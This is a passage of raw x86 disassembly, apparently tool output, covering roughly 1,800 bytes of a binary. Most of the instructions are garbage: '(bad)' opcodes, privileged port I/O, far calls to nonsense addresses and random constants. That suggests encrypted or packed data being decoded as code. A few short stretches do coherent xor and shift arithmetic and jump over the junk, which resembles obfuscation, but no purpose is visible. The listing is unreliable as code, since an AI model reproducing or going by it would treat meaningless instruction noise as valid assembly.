  408b36:	mov    eax,0xcacdf72f
  408b3b:	fxch   st(1)
  408b3d:	inc    esi
  408b3e:	fidiv  WORD PTR [ecx-0x24bfd177]
  408b44:	mov    ah,0xbf
  408b46:	int3   
  408b47:	mov    esp,edx
  408b49:	outs   dx,DWORD PTR ds:[esi]
  408b4a:	call   0xf14:0x6adce206
  408b51:	fs inc ebx
  408b53:	loopne 0x408bb7
  408b55:	in     al,dx
  408b56:	mov    bl,0x23
  408b58:	outs   dx,BYTE PTR ds:[esi]
  408b59:	repz xchg esi,eax
  408b5b:	ret    0xc166
  408b5e:	ja     0x408bc2
  408b60:	add    al,0xed
  408b62:	add    eax,0x1fdde97b
  408b67:	icebp  
  408b68:	mov    ch,0xa3
  408b6a:	ret    
  408b6b:	or     eax,0xf6ab4475
  408b70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b71:	mov    ah,0xcd
  408b73:	or     cl,bl
  408b75:	(bad)  
  408b76:	sbb    bl,ah
  408b78:	xor    DWORD PTR [edx],eax
  408b7a:	push   edi
  408b7b:	push   0xc6cd0f33
  408b80:	ret    0x5099
  408b83:	inc    ecx
  408b84:	push   0xbd3c0262
  408b89:	mov    ebp,0xbc3deb04
  408b8e:	add    BYTE PTR fs:[edx-0x8ed4212],dl
  408b95:	sar    BYTE PTR [ebp+0xe1181c2],1
  408b9b:	test   BYTE PTR [ebx+0x4f],dh
  408b9e:	inc    esi
  408b9f:	dec    ecx
  408ba0:	inc    edi
  408ba1:	jne    0x408c1e
  408ba3:	mov    ecx,0xd381e72f
  408ba8:	inc    esp
  408ba9:	pop    esi
  408baa:	or     BYTE PTR [edx+0x25],0x48
  408bae:	push   eax
  408baf:	jnp    0x408bc4
  408bb1:	not    BYTE PTR [ecx-0x63]
  408bb4:	ins    DWORD PTR es:[edi],dx
  408bb5:	cmp    al,0xe5
  408bb7:	cmp    DWORD PTR [ebp+0x26bdb04a],esi
  408bbd:	cmp    BYTE PTR [esi],dh
  408bbf:	fmul   DWORD PTR [edi+0x410c4199]
  408bc5:	mov    ch,0xb6
  408bc7:	ret    0x3cf1
  408bca:	clc    
  408bcb:	rcl    DWORD PTR [esi+0x272c6daf],cl
  408bd1:	and    eax,0x13cdd46b
  408bd6:	mov    ds:0xec22321a,al
  408bdb:	xor    DWORD PTR [ebx+ebx*8-0x8],edx
  408bdf:	jb     0x408b87
  408be1:	add    ah,BYTE PTR [edi-0x7753c7ca]
  408be7:	cmc    
  408be8:	jg     0x408c51
  408bea:	pop    ebx
  408beb:	cmp    DWORD PTR [edx+0x66656ebe],0x1a6b2e23
  408bf5:	push   edi
  408bf6:	inc    esp
  408bf7:	ss leave 
  408bf9:	cwde   
  408bfa:	mov    dl,0x14
  408bfc:	shl    bh,cl
  408bfe:	aas    
  408bff:	retf   
  408c00:	add    bl,0x14
  408c03:	ret    0x1aa8
  408c06:	in     al,dx
  408c07:	fsubr  QWORD PTR [esi+0x718896a2]
  408c0d:	push   0xb29dfa40
  408c12:	push   ecx
  408c13:	jecxz  0x408c1c
  408c15:	lea    ebx,[edx]
  408c17:	(bad)  
  408c19:	hlt    
  408c1a:	push   ds
  408c1b:	pop    ecx
  408c1c:	icebp  
  408c1d:	lds    ebp,FWORD PTR [eax]
  408c1f:	dec    ebx
  408c20:	mov    dh,0x18
  408c22:	push   ebx
  408c23:	pop    ds
  408c24:	fwait
  408c25:	push   cs
  408c26:	in     eax,0xb0
  408c28:	ror    DWORD PTR [ecx],cl
  408c2a:	push   0xd7717b1c
  408c2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c30:	mov    ch,BYTE PTR [esi+0x32231ff1]
  408c36:	add    BYTE PTR [ebx-0xa],bl
  408c39:	cli    
  408c3a:	cmp    DWORD PTR [ecx+0xf],edx
  408c3d:	xchg   esi,eax
  408c3e:	aaa    
  408c3f:	cli    
  408c40:	int    0x65
  408c42:	xor    eax,0x74b0e388
  408c47:	rcl    DWORD PTR [edx],1
  408c49:	outs   dx,BYTE PTR ds:[esi]
  408c4a:	and    al,0xc
  408c4c:	pop    esi
  408c4d:	dec    ebp
  408c4e:	adc    bl,dh
  408c50:	cmp    edi,ebx
  408c52:	daa    
  408c53:	dec    edi
  408c54:	sub    DWORD PTR [ebp+0x52709478],esp
  408c5a:	rol    BYTE PTR [esi+0x753f9b63],0x22
  408c61:	ret    0xa996
  408c64:	jno    0x408ce1
  408c66:	fcomp  QWORD PTR [edx+0x711b032b]
  408c6c:	cmp    eax,0x337c5f46
  408c71:	lock loopne 0x408c0f
  408c74:	xchg   edx,eax
  408c75:	(bad)  
  408c77:	rcl    BYTE PTR [edi-0x62],cl
  408c7a:	arpl   bx,si
  408c7c:	leave  
  408c7d:	cmc    
  408c7e:	lock or esi,DWORD PTR [ecx]
  408c81:	leave  
  408c82:	test   eax,0xb6ed6368
  408c87:	adc    eax,0xc3dfcaa9
  408c8c:	sub    DWORD PTR [ecx],edi
  408c8e:	in     al,0xa9
  408c90:	sbb    DWORD PTR [edx+eiz*4],esp
  408c93:	push   esp
  408c94:	dec    ecx
  408c95:	sub    al,BYTE PTR [ebp+0x20a84123]
  408c9b:	jp     0x408c4d
  408c9d:	lods   eax,DWORD PTR ds:[esi]
  408c9e:	pop    esp
  408c9f:	loop   0x408c87
  408ca1:	aas    
  408ca2:	aam    0xb5
  408ca4:	mov    dh,BYTE PTR [edi+0x1b1f7bb3]
  408caa:	rol    cl,cl
  408cac:	mov    al,0x97
  408cae:	mov    eax,0x941c416c
  408cb3:	jns    0x408c7f
  408cb5:	leave  
  408cb6:	add    DWORD PTR [ebx+0x32],esi
  408cb9:	scas   eax,DWORD PTR es:[edi]
  408cba:	loope  0x408d34
  408cbc:	add    al,0x72
  408cbe:	inc    ecx
  408cbf:	xor    al,0x20
  408cc1:	ja     0x408cc3
  408cc3:	or     al,0xbd
  408cc5:	(bad)  
  408cc6:	out    dx,al
  408cc7:	(bad)  [esi]
  408cc9:	xchg   si,ax
  408ccb:	mov    al,0xc
  408ccd:	xor    al,0xf5
  408ccf:	inc    edx
  408cd0:	dec    ebx
  408cd1:	mov    ah,0xa5
  408cd3:	xchg   DWORD PTR [eax+eax*8+0x69],esi
  408cd7:	outs   dx,DWORD PTR gs:[esi]
  408cd9:	jo     0x408c77
  408cdb:	pop    eax
  408cdc:	sub    al,0x18
  408cde:	fcmovbe st,st(6)
  408ce0:	add    cl,bh
  408ce2:	xlat   BYTE PTR ds:[ebx]
  408ce3:	call   0x642a:0x99e9fbf9
  408cea:	or     esp,DWORD PTR [edx-0x3e6d2fc8]
  408cf0:	imul   ecx,DWORD PTR [ecx-0x50],0xca9e15b4
  408cf7:	adc    al,0x64
  408cf9:	retf   
  408cfa:	or     al,0x12
  408cfc:	push   0x5f
  408cfe:	mov    DWORD PTR [eax],esi
  408d00:	jns    0x408d58
  408d02:	cwde   
  408d03:	mov    edi,0x5c936ddb
  408d08:	popa   
  408d09:	neg    DWORD PTR [ebx+0x1bdd6181]
  408d0f:	retf   0x55f6
  408d12:	cmp    cl,BYTE PTR [edx+edx*1-0x33]
  408d16:	push   ds
  408d17:	sub    cl,ah
  408d19:	in     eax,dx
  408d1a:	mov    edi,0xffdf1a1c
  408d1f:	in     al,dx
  408d20:	and    al,BYTE PTR [ecx+0x4972edb1]
  408d26:	pop    es
  408d27:	bnd jmp 0x9f91d6b7
  408d2d:	sbb    eax,edx
  408d2f:	push   es
  408d30:	(bad)  
  408d31:	add    BYTE PTR [esi-0x62651c49],dh
  408d37:	and    al,0x67
  408d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d3a:	in     al,0x33
  408d3c:	xor    DWORD PTR [ecx-0x76],edi
  408d3f:	mov    eax,0x6617ed50
  408d44:	push   esi
  408d45:	cmp    dh,dl
  408d47:	sbb    DWORD PTR [esp+eax*4],eax
  408d4a:	out    dx,eax
  408d4b:	mov    WORD PTR [eax-0x571e0301],cs
  408d51:	jo     0x408cfe
  408d53:	sub    BYTE PTR [esi],cl
  408d55:	fs jnp 0x408d8d
  408d58:	in     eax,dx
  408d59:	push   ds
  408d5a:	lahf   
  408d5b:	mov    ecx,0x63a53e15
  408d60:	jg     0x408cf4
  408d62:	add    ecx,DWORD PTR [esi+ebx*4+0x2e52f468]
  408d69:	mov    bh,BYTE PTR [esi+0x18]
  408d6c:	xlat   BYTE PTR ds:[ebx]
  408d6d:	aaa    
  408d6e:	mov    ebx,0xe02483de
  408d73:	repz adc eax,0xb153e4cf
  408d79:	dec    ebp
  408d7a:	mov    esi,0xbf587870
  408d7f:	mov    ebp,DWORD PTR [ebx]
  408d81:	add    dl,BYTE PTR [eax+0x9]
  408d84:	xchg   BYTE PTR [edi+0x1a],al
  408d87:	imul   ebx,DWORD PTR [eax],0x23
  408d8a:	adc    dl,ch
  408d8c:	in     al,0xf3
  408d8e:	sbb    BYTE PTR [eax-0x41a18697],dh
  408d94:	mov    bh,0xd8
  408d96:	test   BYTE PTR ss:[ebx],al
  408d99:	sbb    DWORD PTR [esi+0x1b2b29c7],ebx
  408d9f:	pushf  
  408da0:	and    eax,0x876539c9
  408da5:	mov    dl,BYTE PTR [ecx]
  408da7:	cmp    eax,0xd9b821a6
  408dac:	cwde   
  408dad:	inc    ebx
  408dae:	inc    ebp
  408daf:	inc    ebx
  408db0:	(bad)  
  408db2:	jnp    0x408de6
  408db4:	(bad)  
  408db5:	dec    eax
  408db6:	in     al,dx
  408db7:	ret    
  408db8:	sub    esp,DWORD PTR [ecx+0x603f7287]
  408dbe:	cdq    
  408dbf:	mov    ch,BYTE PTR ds:0x74d3e2c6
  408dc5:	aas    
  408dc6:	es mov esp,0x61da56da
  408dcc:	pop    edi
  408dcd:	sbb    bl,BYTE PTR [esi+eiz*1-0x35d84f8b]
  408dd4:	dec    ecx
  408dd5:	sahf   
  408dd6:	mov    bl,0x91
  408dd8:	sahf   
  408dd9:	icebp  
  408dda:	outs   dx,DWORD PTR ds:[esi]
  408ddb:	cmp    eax,0x7e056242
  408de0:	mov    ebp,0xa5fb1afc
  408de5:	sub    eax,0xcab213c3
  408dea:	cmp    eax,0x91a9da49
  408def:	push   ss
  408df0:	in     al,dx
  408df1:	xchg   edi,eax
  408df2:	push   eax
  408df3:	push   0x23
  408df5:	out    0x2e,al
  408df7:	pop    eax
  408df8:	jae    0x408dfb
  408dfa:	inc    ecx
  408dfb:	cwde   
  408dfc:	enter  0xc0a9,0x62
  408e00:	mov    dh,0x7c
  408e02:	xchg   esp,eax
  408e03:	test   BYTE PTR [ecx+esi*1+0x4dce4ac8],0x18
  408e0b:	cmp    BYTE PTR [edi],ch
  408e0d:	bound  edi,QWORD PTR ss:[edx-0x10f15e41]
  408e14:	test   eax,0xb8c1e7e7
  408e19:	aad    0x98
  408e1b:	fs push ds
  408e1d:	add    al,0x2
  408e1f:	and    bh,bl
  408e21:	xor    DWORD PTR [esi+esi*8+0x22],edi
  408e25:	and    al,0xc4
  408e27:	mov    esi,0x4180ae
  408e2c:	add    bh,BYTE PTR [ebx]
  408e2e:	and    bh,BYTE PTR [ecx+0x4acd701]
  408e34:	mov    es,WORD PTR [eax]
  408e36:	in     al,0x2d
  408e38:	jge    0x408dba
  408e3a:	std    
  408e3b:	push   ebx
  408e3c:	xchg   esp,eax
  408e3d:	cld    
  408e3e:	call   0x2d0:0xac0fb51d
  408e45:	mov    DWORD PTR [ebp+0x14],eax
  408e48:	mov    eax,DWORD PTR [esi]
  408e4a:	xor    DWORD PTR [ebp+0x14],edi
  408e4d:	shr    edx,0x2
  408e50:	mov    edx,DWORD PTR [esi+0x4]
  408e53:	xor    edx,edx
  408e55:	shl    eax,0x1e
  408e58:	or     edx,DWORD PTR [ebp+0x14]
  408e5b:	mov    DWORD PTR [ebp-0x28],edx
  408e5e:	mov    eax,DWORD PTR [ebp-0x24]
  408e61:	mov    eax,DWORD PTR [ebp-0x24]
  408e64:	jmp    0x409242
  408e69:	and    al,BYTE PTR [ebp-0x6d]
  408e6c:	pop    ss
  408e6d:	jb     0x408e35
  408e6f:	and    ah,BYTE PTR ds:0x7e10ec41
  408e75:	fistp  DWORD PTR [edi+edx*2-0x56]
  408e79:	cmp    dl,BYTE PTR [ecx+0x18]
  408e7c:	sbb    BYTE PTR [esi+0x78181812],bl
  408e82:	dec    esp
  408e83:	pop    ss
  408e84:	daa    
  408e85:	lahf   
  408e86:	outs   dx,DWORD PTR ds:[esi]
  408e87:	mov    DWORD PTR [edx+0x7132564b],0xb44dd272
  408e91:	fidiv  WORD PTR [edx]
  408e93:	jmp    0xc9b9:0x7c384a78
  408e9a:	js     0x408e7e
  408e9c:	xor    eax,0x22c68b8e
  408ea1:	out    0x72,eax
  408ea3:	(bad)  
  408ea4:	daa    
  408ea5:	(bad)  
  408ea6:	fs xchg edx,edx
  408ea9:	sub    BYTE PTR [edx+edi*8-0x6],cl
  408ead:	jns    0x408e52
  408eaf:	jg     0x408ef7
  408eb1:	scas   eax,DWORD PTR es:[edi]
  408eb2:	scas   al,BYTE PTR es:[edi]
  408eb3:	xor    ebx,edi
  408eb5:	cmp    eax,0x9bcb7d29
  408eba:	jo     0x408e43
  408ebc:	or     edi,edx
  408ebe:	add    eax,0xfda0275a
  408ec3:	adc    BYTE PTR [esi-0x60],0xbd
  408ec7:	in     eax,dx
  408ec8:	mov    al,BYTE PTR [edi+esi*4+0x6d]
  408ecc:	aas    
  408ecd:	dec    ebp
  408ecf:	test   BYTE PTR [eax],cl
  408ed1:	cmp    DWORD PTR [esi],esp
  408ed3:	aad    0x83
  408ed5:	sub    edx,DWORD PTR [ebx-0x5f]
  408ed8:	mov    bh,0xdf
  408eda:	or     edi,DWORD PTR [edi-0x12]
  408edd:	loope  0x408e66
  408edf:	push   ss
  408ee0:	push   esi
  408ee1:	f2xm1  
  408ee3:	xor    edi,edx
  408ee5:	sub    ah,BYTE PTR [esi+eiz*2+0x7590d08a]
  408eec:	aad    0x73
  408eee:	repz adc esp,DWORD PTR [esi-0x26d01f17]
  408ef5:	int    0xd3
  408ef7:	sbb    edx,DWORD PTR [esi+0x2ef8bcec]
  408efd:	jmp    0x408f36
  408eff:	jmp    0xde19df33
  408f04:	lds    esp,FWORD PTR [esi+0x1b]
  408f07:	cmp    esi,DWORD PTR [esi]
  408f09:	and    DWORD PTR [edi-0x542308db],ecx
  408f0f:	pop    ds
  408f10:	(bad)  
  408f11:	stos   BYTE PTR es:[edi],al
  408f12:	adc    bh,BYTE PTR [eax+0x61]
  408f15:	push   0x7dd0d596
  408f1a:	mov    edx,0x9948bb7
  408f1f:	jnp    0x408edb
  408f21:	sbb    DWORD PTR [ebx],eax
  408f23:	mov    esi,0x2d468031
  408f28:	ror    DWORD PTR [ecx-0x6fa7ad77],cl
  408f2e:	jo     0x408f07
  408f30:	(bad)  
  408f31:	dec    esi
  408f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f33:	pushf  
  408f34:	scas   eax,DWORD PTR es:[edi]
  408f35:	jb     0x408f62
  408f37:	xchg   ebp,eax
  408f38:	adc    ah,BYTE PTR [esi+eiz*4]
  408f3b:	mov    ecx,ebp
  408f3d:	aaa    
  408f3e:	pop    eax
  408f3f:	outs   dx,DWORD PTR ds:[esi]
  408f40:	in     al,0x81
  408f42:	adc    eax,0xff400a36
  408f47:	push   ds
  408f48:	mov    bl,0xda
  408f4a:	cmc    
  408f4b:	sti    
  408f4c:	and    al,0x83
  408f4e:	lea    ebx,[edx+0x4f]
  408f51:	out    dx,eax
  408f52:	mov    ebp,0x8c24b22
  408f57:	sub    ebx,DWORD PTR [eax+0x7e]
  408f5a:	xchg   ecx,eax
  408f5b:	inc    esi
  408f5c:	pusha  
  408f5d:	scas   eax,DWORD PTR es:[edi]
  408f5e:	test   al,0xe5
  408f60:	aaa    
  408f61:	pop    ebp
  408f62:	xchg   edx,eax
  408f63:	and    dh,0xb5
  408f66:	mov    BYTE PTR [edi],ch
  408f68:	pop    edx
  408f69:	mov    edi,0x210f13a
  408f6e:	pushf  
  408f6f:	out    dx,al
  408f70:	xor    al,BYTE PTR [ecx+0x79]
  408f73:	push   ss
  408f74:	imul   ecx,esp,0xb
  408f77:	push   ds
  408f78:	and    DWORD PTR [esp+ebx*8+0x0],ebx
  408f7c:	adc    BYTE PTR [ecx+0x3b],bl
  408f7f:	mov    edx,0x870aa04d
  408f84:	xchg   ah,cl
  408f86:	(bad)  
  408f87:	rcr    BYTE PTR [edi+eax*8+0x6afe07f8],cl
  408f8e:	xor    eax,0xe97909a4
  408f93:	sub    eax,0xd6572db1
  408f98:	push   edi
  408f99:	jle    0x408fc9
  408f9b:	and    al,0xa1
  408f9d:	stos   BYTE PTR es:[edi],al
  408f9e:	fwait
  408f9f:	or     eax,0xd0e0ad2
  408fa4:	js     0xb3321ccc
  408faa:	dec    edx
  408fab:	imul   esp,DWORD PTR [ebp+eax*1+0x2],0xffffffb9
  408fb0:	inc    esp
  408fb1:	xchg   ecx,eax
  408fb2:	int3   
  408fb3:	mov    ?,ecx
  408fb5:	push   eax
  408fb6:	sub    al,0x5e
  408fb8:	scas   eax,DWORD PTR es:[edi]
  408fb9:	jle    0x408ff4
  408fbb:	pop    ebx
  408fbc:	fld    TBYTE PTR [eax-0x69a89143]
  408fc2:	mov    dl,0x20
  408fc4:	cmp    DWORD PTR ds:0x20c5d2dd,esi
  408fca:	mov    edi,0x1adac40
  408fcf:	fstp   DWORD PTR [esi-0x54cb7c22]
  408fd5:	aad    0x15
  408fd7:	cli    
  408fd8:	xchg   BYTE PTR [edx+0x58c0bd39],dh
  408fde:	aaa    
  408fdf:	shr    DWORD PTR [ecx+0x58535134],1
  408fe5:	push   edi
  408fe6:	ja     0x409035
  408fe8:	int    0xb1
  408fea:	push   ebx
  408feb:	and    eax,0x7db1e631
  408ff0:	xchg   ebx,eax
  408ff1:	dec    ebp
  408ff2:	pop    esp
  408ff3:	or     ebx,DWORD PTR [eax+0x4547a40c]
  408ff9:	ins    DWORD PTR es:[edi],dx
  408ffa:	shl    BYTE PTR [edx-0x2c7be411],0x8b
  409001:	jae    0x40907c
  409003:	lahf   
  409004:	dec    edx
  409005:	xchg   ebp,eax
  409006:	mov    esp,ss
  409008:	mov    eax,DWORD PTR [eax]
  40900a:	pop    esp
  40900b:	xlat   BYTE PTR ds:[ebx]
  40900c:	mov    dl,0xfe
  40900e:	dec    edx
  40900f:	or     DWORD PTR [ecx+0x6a],ecx
  409012:	popf   
  409013:	loope  0x408fc5
  409015:	clc    
  409016:	xor    BYTE PTR [esi],bl
  409018:	xchg   edx,eax
  409019:	adc    edi,DWORD PTR fs:[ebp+0x2b]
  40901d:	or     eax,0x70e9edc1
  409022:	dec    ebp
  409023:	(bad)  
  409024:	sbb    dh,dh
  409026:	in     al,0xaa
  409028:	ja     0x408fc2
  40902a:	adc    al,0x38
  40902c:	push   esi
  40902d:	mov    DWORD PTR [eax],eax
  40902f:	mov    dh,0x3d
  409031:	push   ecx
  409032:	jmp    0xdef7:0x90bd6c4
  409039:	ret    
  40903a:	and    DWORD PTR [ebp+0x4d],esp
  40903d:	push   esi
  40903e:	xchg   DWORD PTR [esi],eax
  409040:	lahf   
  409041:	and    dl,BYTE PTR [ecx+esi*4+0x5390e057]
  409048:	scas   al,BYTE PTR es:[edi]
  409049:	fs and eax,0xe9d4c4c
  40904f:	sub    ebp,DWORD PTR [ebx]
  409051:	cwde   
  409052:	push   0xe3f78b52
  409057:	jae    0x409034
  409059:	or     ebx,edx
  40905b:	jmp    0x2f523393
  409060:	scas   eax,DWORD PTR es:[edi]
  409061:	push   es
  409062:	(bad)  
  409063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409064:	pusha  
  409065:	scas   al,BYTE PTR es:[edi]
  409066:	ret    0xb40c
  409069:	mov    al,cl
  40906b:	das    
  40906c:	hlt    
  40906d:	cs lock int 0x9b
  409071:	stos   DWORD PTR es:[edi],eax
  409072:	adc    ah,BYTE PTR ds:0x12db1106
  409078:	jmp    0x4090b7
  40907a:	push   ss
  40907b:	pop    eax
  40907c:	iret   
  40907d:	js     0x40903d
  40907f:	bound  ebx,QWORD PTR [edx+0x655d2179]
  409085:	dec    esp
  409086:	(bad)  
  409087:	cmp    ebx,edx
  409089:	cmc    
  40908a:	scas   eax,DWORD PTR es:[edi]
  40908b:	into   
  40908c:	ss push es
  40908e:	inc    esi
  40908f:	rcl    BYTE PTR [ebp+0xd],cl
  409092:	sbb    eax,0xc695c843
  409097:	xchg   edx,eax
  409098:	stos   BYTE PTR es:[edi],al
  409099:	mov    eax,ds:0x24af32f2
  40909e:	inc    edx
  40909f:	(bad)  
  4090a0:	xlat   BYTE PTR ds:[ebx]
  4090a1:	xchg   ecx,eax
  4090a2:	pop    ecx
  4090a3:	(bad)  
  4090a4:	outs   dx,BYTE PTR ds:[esi]
  4090a5:	in     al,0xaf
  4090a7:	lods   al,BYTE PTR ds:[esi]
  4090a8:	jns    0x40910d
  4090aa:	xor    eax,DWORD PTR [edi]
  4090ac:	push   cs
  4090ad:	jo     0x409070
  4090af:	push   0xffffffc5
  4090b1:	es inc ebx
  4090b3:	mov    eax,ds:0x9346fa30
  4090b8:	pop    ebx
  4090b9:	imul   esp,DWORD PTR [ebx+0xd1c47cf],0x1e0d1ab4
  4090c3:	dec    ebp
  4090c4:	es ret 0x237d
  4090c8:	push   ecx
  4090c9:	in     eax,0x22
  4090cb:	popa   
  4090cc:	sbb    dh,BYTE PTR [eax+0x3204cac]
  4090d2:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  4090d4:	clc    
  4090d5:	out    0x2e,eax
  4090d7:	push   ds
  4090d8:	mov    ch,0x55
  4090da:	ja     0x4090a7
  4090dc:	dec    esp
  4090dd:	add    ch,BYTE PTR ds:0x927db55e
  4090e3:	pusha  
  4090e4:	xchg   edi,eax
  4090e5:	add    DWORD PTR [edx],ecx
  4090e7:	lea    esi,[ebp-0x417545e3]
  4090ed:	lods   al,BYTE PTR ds:[esi]
  4090ee:	hlt    
  4090ef:	jae    0x4090a6
  4090f1:	fs enter 0xebbd,0xbc
  4090f6:	dec    ebx
  4090f7:	sub    eax,0x7d252c23
  4090fc:	scas   al,BYTE PTR es:[edi]
  4090fd:	pop    esp
  4090fe:	retf   0xed59
  409101:	or     edx,ebx
  409103:	stos   BYTE PTR es:[edi],al
  409104:	leave  
  409105:	xor    BYTE PTR [ebx],ch
  409107:	adc    ebx,DWORD PTR [ebx+0x3a]
  40910a:	(bad)  
  40910b:	sar    DWORD PTR [edx-0xd],1
  40910e:	popa   
  40910f:	gs loop 0x4090b4
  409112:	inc    edi
  409113:	sbb    al,0xcf
  409115:	call   0xabe75a0e
  40911a:	mov    edx,0x6c5a8fbb
  40911f:	enter  0x76ba,0x83
  409123:	push   ecx
  409124:	mov    fs,WORD PTR [ebp+esi*4-0x34981ba5]
  40912b:	inc    ecx
  40912c:	jmp    0x65fa2f52
  409131:	mov    edx,0x97227e8a
  409136:	dec    ebp
  409137:	mov    eax,0x47b373e6
  40913c:	jbe    0x40912a
  40913e:	cmc    
  40913f:	and    ecx,esi
  409141:	or     DWORD PTR ds:0xa530a5e5,0x3839df16
  40914b:	pop    ss
  40914c:	dec    edx
  40914d:	aaa    
  40914e:	sbb    BYTE PTR [ebp-0x13],ch
  409151:	test   eax,0xa2a8e21d
  409156:	adc    al,cl
  409158:	fild   WORD PTR [ecx+0x866e04e]
  40915e:	retf   0xc8b1
  409161:	add    ebx,DWORD PTR [ebp-0x9a94469]
  409167:	add    DWORD PTR [edi+0x4b040d39],eax
  40916d:	sub    cl,0xbc
  409170:	mov    ds:0x8ec4e0c0,eax
  409175:	pushf  
  409176:	xchg   edx,eax
  409177:	or     al,BYTE PTR [ecx+edi*8-0x4c]
  40917b:	lods   eax,DWORD PTR ds:[esi]
  40917c:	xlat   BYTE PTR ds:[ebx]
  40917d:	pop    esp
  40917e:	sub    DWORD PTR [edx+0x11],ebx
  409181:	adc    BYTE PTR ss:[esi+0x69],dl
  409185:	pop    ecx
  409186:	neg    ecx
  409188:	sbb    DWORD PTR [edi+0x7a5eba23],ebx
  40918e:	and    ebx,DWORD PTR [edi-0x1f9bb6d4]
  409194:	(bad)  
  409195:	cmp    al,0xe
  409197:	das    
  409198:	adc    DWORD PTR [ecx],ebp
  40919a:	mov    esp,ecx
  40919c:	xchg   DWORD PTR [ebx-0x7e],ebp
  40919f:	sbb    DWORD PTR [edx+0x6ad6667e],ebp
  4091a5:	add    bl,cl
  4091a7:	loope  0x40913d
  4091a9:	pop    ss
  4091aa:	add    DWORD PTR [ecx+0x1d],eax
  4091ad:	fadd   DWORD PTR [esi+0x226ceb06]
  4091b3:	ja     0x40918b
  4091b5:	push   edx
  4091b6:	nop
  4091b7:	ss ins BYTE PTR es:[edi],dx
  4091b9:	xchg   esp,eax
  4091ba:	imul   esi,DWORD PTR [ebp-0x62],0x5a
  4091be:	ret    0x465b
  4091c1:	mov    ds:0x2a767c76,eax
  4091c6:	rol    BYTE PTR [ecx+0x69],0x31
  4091ca:	mov    ebp,0x59722726
  4091cf:	fsubr  st,st(4)
  4091d1:	or     ebx,DWORD PTR [esi+0x5cf2896b]
  4091d7:	push   edi
  4091d8:	pop    esi
  4091d9:	aad    0xe6
  4091db:	add    BYTE PTR [edi-0x5da7c40c],ch
  4091e1:	xchg   ebx,eax
  4091e2:	push   eax
  4091e3:	dec    esp
  4091e4:	das    
  4091e5:	jl     0x409168
  4091e7:	aaa    
  4091e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091e9:	push   edx
  4091ea:	aaa    
  4091eb:	in     eax,0xc1
  4091ed:	sub    DWORD PTR ss:[edx-0x550ab39f],esp
  4091f4:	inc    ebx
  4091f5:	pop    ds
  4091f6:	aam    0xd9
  4091f8:	push   ebx
  4091f9:	dec    eax
  4091fa:	or     edx,DWORD PTR [esi-0x7d]
  4091fd:	dec    eax
  4091fe:	inc    eax
  4091ff:	dec    edx
  409200:	gs dec edx
  409202:	jmp    0x40922b
  409204:	outs   dx,BYTE PTR ds:[esi]
  409205:	dec    edx
  409206:	push   esp
  409207:	jne    0x409217
  409209:	ror    DWORD PTR [esi],1
  40920b:	xchg   esp,eax
  40920c:	imul   edi,DWORD PTR [ebx],0xffffffc8
  40920f:	popf   
  409210:	pop    edx
  409211:	rcl    ch,1
  409213:	out    0x34,al
  409215:	mov    bl,0x61
  409217:	mov    ds:0xac5041f0,al
  40921c:	dec    edx
  40921d:	jae    0x409245
  40921f:	mov    BYTE PTR [ecx],ch
  409221:	in     al,dx
  409222:	lahf   
  409223:	inc    esp
  409224:	push   esi
  409225:	stos   BYTE PTR es:[edi],al
  409226:	add    ah,BYTE PTR [eax]
  409228:	fiadd  WORD PTR [edi]
  40922a:	jbe    0x409294
  40922c:	outs   dx,DWORD PTR ds:[esi]
  40922d:	jno    0x40922b
  40922f:	push   cs
  409230:	xchg   esp,eax
  409231:	jl     0x409221
  409233:	jecxz  0x40920d
  409235:	push   ecx
  409236:	outs   dx,BYTE PTR ds:[esi]
  409237:	xor    al,BYTE PTR [eax]
  409239:	rol    DWORD PTR es:[ecx],1
  40923c:	(bad)  
  40923d:	pop    ss
  40923e:	rcr    DWORD PTR [esi+0x7d],cl
  409241:	pop    edi
  409242:	xor    edx,edx
  409244:	shld   edx,eax,0x2
  409248:	xor    edx,ecx
  40924a:	mov    DWORD PTR [ebp+0xc],edx
  40924d:	jmp    0x40962b
  409252:	loop   0x409279
  409254:	es jmp 0x617f:0x1d1aea26
  40925c:	mov    eax,ds:0x756e7b70
  409261:	jl     0x409223
  409263:	dec    ecx
  409264:	sbb    BYTE PTR [eax],bl
  409266:	sahf   
  409267:	adc    bl,BYTE PTR [eax]
  409269:	sbb    bh,dh
  40926b:	cmp    BYTE PTR [edi-0x22],0x35
  40926f:	sahf   
  409270:	xchg   edi,eax
  409271:	je     0x40929c
  409273:	lods   al,BYTE PTR ds:[esi]
  409274:	mov    ebx,0xc1a8333b
  409279:	mov    ch,0x60
  40927b:	push   ds
  40927c:	in     eax,0xbf
  40927e:	add    edx,esi
  409280:	cwde   
  409281:	mov    cl,0x70
  409283:	aam    0xcd
  409285:	jecxz  0x4092cb
  409287:	test   ebp,ebp
  409289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40928a:	jns    0x4092fc
  40928c:	fdivr  QWORD PTR [edi]
  40928e:	add    esp,ecx
  409290:	mov    dh,0xed
  409292:	or     DWORD PTR [ebp-0x49],ebp
  409295:	add    ch,al
  409297:	imul   edx,DWORD PTR [ebx+esi*1],0xffffff92
  40929b:	pop    eax
  40929c:	out    0xa9,al
  40929e:	push   cs
  40929f:	add    eax,0x7be8260c
  4092a4:	loop   0x409286
  4092a6:	jne    0x40927b
  4092a8:	cli    
  4092a9:	xor    BYTE PTR [edi],dh
  4092ab:	clc    
  4092ac:	mov    edi,0x39358f97
  4092b1:	and    ebp,0x10
  4092b4:	sbb    eax,0x68917879
  4092b9:	or     al,0x2a
  4092bb:	je     0x4092ac
  4092bd:	adc    DWORD PTR [edx],edi
  4092bf:	test   BYTE PTR [ebx+0x534c57df],cl
  4092c5:	inc    esp
  4092c6:	aad    0x0
  4092c8:	icebp  
  4092c9:	aam    0xcb
  4092cb:	call   0x750b2a0c
  4092d0:	(bad)  
  4092d1:	into   
  4092d2:	push   eax
  4092d3:	and    DWORD PTR ds:0x2d8f7e50,ebp
  4092d9:	pop    eax
  4092da:	mov    ch,0x7c
  4092dc:	jmp    0x409315
  4092de:	xor    eax,0xbaad643
  4092e3:	mov    ecx,0x52a0a9a4
  4092e8:	es shr esp,0xda
  4092ec:	(bad)  
  4092ed:	sub    al,0x83
